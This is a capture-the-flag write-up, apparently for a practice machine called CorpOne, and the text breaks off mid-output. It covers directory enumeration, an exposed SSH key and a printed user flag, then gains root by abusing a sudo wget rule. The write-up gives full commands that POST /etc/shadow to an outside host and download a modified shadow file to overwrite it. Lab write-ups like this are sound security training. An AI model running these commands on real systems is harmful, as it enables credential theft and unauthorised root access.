Gobuster shows a `/sitemap` and on the index in the source I found the follwing:
```
 <!-- Jessie don't forget to udate the webiste -->
```

Possibly some outdated software? And a hint at a possible username `Jessie`

`/sitemap` is actually a full fledged website. But I can't really find anything
useful on there. After running gobuster again on the `/sitemap` address I found
a `/.ssh` folder which actually contains a valid ssh key!


1. User flag

The ssh key allows us to log in to the machine as the `jessie` user. Seems the
user flag is located in the Documents folder in the homedir of jessie:
```
$ find / -type f -name "*flag*" 2>/dev/null
/home/jessie/Documents/user_flag.txt
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

2. Root flag

`sudo -l` shows we can run `/usr/bin/wget` as root without password:

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Seeing that we can wget to both POST and GET files, we could POST the contents
of `/etc/shadow` file to set a password on the root user and then GET that file
to log in as root with our custom password.

```
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.8.39.224:8888
--2020-06-02 14:48:46--  http://10.8.39.224:8888/
Connecting to 10.8.39.224:8888... connected.
HTTP request sent, awaiting response... No data received.
```

On my laptop I saved the file and inserted my custom root password which I
generated by using `openssl passwd -6 -salt xyz mypassword`. Then I started an
http server with python3 from my working directory and retrieved that file with
wget:

```
jessie@CorpOne:~$ sudo /usr/bin/wget http://10.8.39.224:9999/custom_shadow -O /etc/shadow
--2020-06-02 14:50:42--  http://10.8.39.224:9999/custom_shadow
